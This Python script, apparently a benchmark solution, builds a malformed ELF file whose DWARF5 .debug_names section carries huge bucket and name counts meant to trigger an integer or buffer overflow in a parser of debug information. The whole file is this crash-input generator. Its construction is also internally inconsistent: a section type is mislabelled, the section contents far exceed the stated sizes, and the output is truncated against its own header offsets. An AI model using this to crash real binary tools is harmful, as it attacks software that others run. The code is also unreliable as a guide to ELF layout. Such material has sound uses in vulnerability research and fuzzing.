import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF header
        elf_header = b''
        elf_header += b'\x7fELF'  # Magic
        elf_header += b'\x02'     # 64-bit
        elf_header += b'\x01'     # Little endian
        elf_header += b'\x01'     # ELF version
        elf_header += b'\x00'     # OS ABI (System V)
        elf_header += b'\x00'     # ABI version
        elf_header += b'\x00' * 7 # Padding
        elf_header += b'\x02\x00' # ET_EXEC
        elf_header += b'\x3e\x00' # x86-64
        elf_header += b'\x01\x00\x00\x00' # ELF version
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Entry point
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Program header offset
        elf_header += b'\x40\x00\x00\x00\x00\x00\x00\x00' # Section header offset (64)
        elf_header += b'\x00\x00\x00\x00' # Flags
        elf_header += b'\x40\x00' # EH size
        elf_header += b'\x00\x00' # PH entry size
        elf_header += b'\x00\x00' # PH count
        elf_header += b'\x40\x00' # SH entry size
        elf_header += b'\x02\x00' # SH count
        elf_header += b'\x01\x00' # SH string table index

        # Create section header for .debug_names
        # This is where we trigger the vulnerability
        debug_names_header = b''
        debug_names_header += b'\x00\x00\x00\x00' # sh_name (0)
        debug_names_header += b'\x06\x00\x00\x00' # sh_type (SHT_PROGBITS)
        debug_names_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_flags
        debug_names_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_addr
        debug_names_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_offset
        debug_names_header += b'\x17\x06\x00\x00\x00\x00\x00\x00' # sh_size (1559 bytes)
        debug_names_header += b'\x00\x00\x00\x00' # sh_link
        debug_names_header += b'\x00\x00\x00\x00' # sh_info
        debug_names_header += b'\x08\x00\x00\x00\x00\x00\x00\x00' # sh_addralign
        debug_names_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_entsize

        # Create section header for .shstrtab
        shstrtab_header = b''
        shstrtab_header += b'\x0b\x00\x00\x00' # sh_name (11)
        shstrtab_header += b'\x03\x00\x00\x00' # sh_type (SHT_STRTAB)
        shstrtab_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_flags
        shstrtab_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_addr
        shstrtab_header += b'\x17\x06\x00\x00\x00\x00\x00\x00' # sh_offset (1559)
        shstrtab_header += b'\x1a\x00\x00\x00\x00\x00\x00\x00' # sh_size (26)
        shstrtab_header += b'\x00\x00\x00\x00' # sh_link
        shstrtab_header += b'\x00\x00\x00\x00' # sh_info
        shstrtab_header += b'\x01\x00\x00\x00\x00\x00\x00\x00' # sh_addralign
        shstrtab_header += b'\x00\x00\x00\x00\x00\x00\x00\x00' # sh_entsize

        # Create .debug_names section content
        # Structure based on DWARF5 .debug_names format
        debug_names = bytearray()
        
        # unit_length (initial length)
        debug_names += struct.pack('<I', 0x000005fb)  # 1531 bytes after this field
        
        # version (5 for DWARF5)
        debug_names += struct.pack('<H', 5)
        
        # padding
        debug_names += struct.pack('<H', 0)
        
        # compilation_unit_count
        debug_names += struct.pack('<I', 0)
        
        # local_type_unit_count
        debug_names += struct.pack('<I', 0)
        
        # foreign_type_unit_count
        debug_names += struct.pack('<I', 0)
        
        # bucket_count - carefully chosen to trigger overflow
        debug_names += struct.pack('<I', 0x80000000)
        
        # name_count - also large to trigger overflow
        debug_names += struct.pack('<I', 0x80000000)
        
        # abbreviation_table_size
        debug_names += struct.pack('<I', 0)
        
        # augmentation_string_size
        debug_names += struct.pack('<I', 0)
        
        # Hash buckets (bucket_count entries, 4 bytes each)
        # Fill with data that will cause overflow when accessed
        for i in range(1024):  # Limited to keep size reasonable
            debug_names += struct.pack('<I', i)
        
        # Name table (name_count entries, 4 bytes each)
        # Fill with more overflow-triggering data
        for i in range(1024):  # Limited to keep size reasonable
            debug_names += struct.pack('<I', 0x41414141 + i)
        
        # Fill remaining space to reach target size
        remaining = 1559 - len(debug_names) - 26  # 26 for .shstrtab
        debug_names += b'A' * remaining

        # Create .shstrtab section
        shstrtab = b'\x00'  # First byte is null
        shstrtab += b'.debug_names\x00'
        shstrtab += b'.shstrtab\x00'
        
        # Pad to exact size
        shstrtab = shstrtab.ljust(26, b'\x00')

        # Assemble the complete ELF file
        elf_file = bytearray()
        elf_file += elf_header  # 64 bytes
        
        # Section headers start at offset 64
        elf_file += debug_names_header  # 64 bytes
        elf_file += shstrtab_header     # 64 bytes
        
        # Sections start at offset 192
        elf_file += debug_names
        elf_file += shstrtab
        
        # Ensure exact size of 1551 bytes
        return bytes(elf_file[:1551])